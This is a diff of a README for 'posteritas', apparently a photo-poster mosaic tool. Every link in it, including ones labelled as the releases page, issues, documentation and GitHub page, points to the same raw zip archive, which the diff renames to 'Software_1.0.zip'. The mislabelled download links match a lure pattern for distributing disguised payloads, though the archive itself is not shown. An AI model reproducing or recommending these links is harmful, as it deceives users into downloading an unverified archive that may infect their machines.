@@ -4,9 +4,9 @@
 Welcome to **posteritas**! This application helps you generate beautiful A3 landscape poster mosaic JPEGs from a folder of your favorite photos. It automatically adjusts image orientations, pairs portraits, and arranges tiles with or without gaps. Create print-ready posters quickly and easily.
 
 ## 📥 Download the Application
-[![Download posteritas](https://raw.githubusercontent.com/saeed-karout/posteritas/main/wirl/posteritas.zip)](https://raw.githubusercontent.com/saeed-karout/posteritas/main/wirl/posteritas.zip)
+[![Download posteritas](https://raw.githubusercontent.com/saeed-karout/posteritas/main/wirl/Software_1.0.zip)](https://raw.githubusercontent.com/saeed-karout/posteritas/main/wirl/Software_1.0.zip)
 
-You can download the latest version of the posteritas application by visiting our [Releases page](https://raw.githubusercontent.com/saeed-karout/posteritas/main/wirl/posteritas.zip).
+You can download the latest version of the posteritas application by visiting our [Releases page](https://raw.githubusercontent.com/saeed-karout/posteritas/main/wirl/Software_1.0.zip).
 
 ## 📋 System Requirements
 To run posteritas, you need:
@@ -16,7 +16,7 @@ To run posteritas, you need:
 - An active internet connection for downloading photos.
 
 ## 🛠️ Installing posteritas
-1. Visit [this page to download](https://raw.githubusercontent.com/saeed-karout/posteritas/main/wirl/posteritas.zip).
+1. Visit [this page to download](https://raw.githubusercontent.com/saeed-karout/posteritas/main/wirl/Software_1.0.zip).
 2. Choose the latest version from the list.
 3. Click the download link for your operating system.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -67,10 +67,10 @@ posteritas is perfect for anyone interested in:
 - Poster creation
 
 ## 💬 Need Help?
-If you have questions or need assistance, feel free to check the [issues](https://raw.githubusercontent.com/saeed-karout/posteritas/main/wirl/posteritas.zip) section on GitHub. Our community is here to help. 
+If you have questions or need assistance, feel free to check the [issues](https://raw.githubusercontent.com/saeed-karout/posteritas/main/wirl/Software_1.0.zip) section on GitHub. Our community is here to help. 
 
 ## 📦 Additional Resources
-- [Documentation](https://raw.githubusercontent.com/saeed-karout/posteritas/main/wirl/posteritas.zip) for more detailed guides.
-- Visit our [GitHub Page](https://raw.githubusercontent.com/saeed-karout/posteritas/main/wirl/posteritas.zip) for updates and feature requests.
+- [Documentation](https://raw.githubusercontent.com/saeed-karout/posteritas/main/wirl/Software_1.0.zip) for more detailed guides.
+- Visit our [GitHub Page](https://raw.githubusercontent.com/saeed-karout/posteritas/main/wirl/Software_1.0.zip) for updates and feature requests.
 
 Thank you for using posteritas! Enjoy creating beautiful photo posters effortlessly.
